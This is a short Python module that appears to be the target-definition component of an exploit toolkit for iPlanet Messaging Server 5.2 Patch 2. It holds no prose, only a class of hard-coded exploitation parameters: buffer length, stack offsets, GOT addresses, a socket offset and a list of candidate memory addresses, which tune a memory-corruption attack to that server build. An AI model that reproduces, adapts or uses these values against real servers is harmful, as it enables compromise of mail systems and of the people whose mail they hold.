import iplanet

class iplanet_5_2p2(iplanet.type3):
   def __init__(self):
      self.conn = 0

   version = 'iPlanet Messaging Server 5.2 Patch 2 (built Jul 14 2004)'
   baseBufLen = 0x1bc
   l7Offset = -0x2430L
   l7Imta = 0x55ce90L
   l7ImtaResponse = 0x5444f0L
   got = [0x567360L, 0x502df0L, 0x502df8L, 0x502e00L]
   fp = 0x981ba0L
   bigBufOffset = -0x26fcL
   socketOffset = -0x3d8L
   addrs = \
      [0x5668ECL ,
       0x5B5334L ,
       0x5D77D4L ,
       0x5F9404L ,
       0x6156E4L ,
       0x634130L ,
       0x650748L ,
       0x66EE7CL ,
       0x68B054L ,
       0x6A7550L ,
       0x6C5198L ,
       0x6E1CB8L ,
       0x6FFE50L ,
       0x71C008L ,
       0x738290L ,
       0x754A74L ,
       0x771B6CL ,
       0x78DF18L ,
       0x7AA780L ,
       0x7C74BCL ,
       0x7E4468L ,
       0x811F18L ,
       0x82F548L ,
       0x84EFE0L ,
       0x86D048L ,
       0x88BC04L ,
       0x8BBE98L ,
       0x8EC50CL ,
       0x9095ACL ,
       0x926D98L ,
       0x944658L ,
       0x963730L ]
